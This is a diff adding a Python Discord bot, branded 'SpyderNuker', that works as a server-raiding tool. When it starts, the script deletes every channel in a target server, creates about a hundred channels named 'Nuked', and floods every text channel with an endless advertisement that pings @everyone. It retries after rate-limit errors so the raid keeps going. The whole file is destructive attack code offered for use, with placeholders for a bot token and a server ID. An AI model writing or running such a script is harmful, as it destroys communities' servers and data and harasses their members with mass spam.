@@ -1,0 +1,70 @@
+import discord
+import asyncio
+
+TOKEN = "TOKEN de tu bot"
+SERVER_ID = "ID de tu servidor (Ponerlo sin las comillas)"
+
+intents = discord.Intents.all()
+client = discord.Client(intents=intents)
+
+@client.event
+async def on_ready():
+    guild = client.get_guild(SERVER_ID)
+    if not guild:
+        print(f'No se encontró el servidor con ID {SERVER_ID}')
+        return
+
+    opcion = input("Ingresa 1: ")
+    if opcion != '1':
+        print("Opción no válida")
+        return
+
+    print("Borrando canales...")
+    tasks = []
+    for channel in guild.channels:
+        async def delete_channel(c):
+            try:
+                await c.delete()
+                print(f'{c.name} <-- borrado')
+            except discord.HTTPException as e:
+                if e.status == 429:
+                    await asyncio.sleep(e.retry_after)
+                    await c.delete()
+                else:
+                    print(f'Error al borrar {c.name}')
+        tasks.append(delete_channel(channel))
+    await asyncio.gather(*tasks)
+
+    print("Creando canales...")
+    tasks = []
+    for i in range(101): # <== crea 100 canales (Pueden modificarlo si gustan)
+        async def create_channel(i):
+            try:
+                await guild.create_text_channel(f'[Spyder] => Nuked')
+            except discord.HTTPException as e:
+                if e.status == 429:
+                    await asyncio.sleep(e.retry_after)
+                    await guild.create_text_channel(f'[Spyder] => Nuked')
+                else:
+                    print(f'Error al crear canal: ')
+        tasks.append(create_channel(i))
+    await asyncio.gather(*tasks)
+
+    mensaje = "[Spyder] Raided by SpyderNuker [discord.gg/SpyderNuker] ||@everyone @here @everyone||"
+
+    async def spam(canal):
+        while True:
+            try:
+                await canal.send(mensaje)
+                await asyncio.sleep(0.1)
+            except discord.HTTPException as e:
+                if e.status == 429:
+                    await asyncio.sleep(e.retry_after)
+                else:
+                    print(f"[Spyder] => Error en {canal.name}")
+                    break
+
+    for channel in guild.text_channels:
+        asyncio.create_task(spam(channel))
+
+client.run(TOKEN)
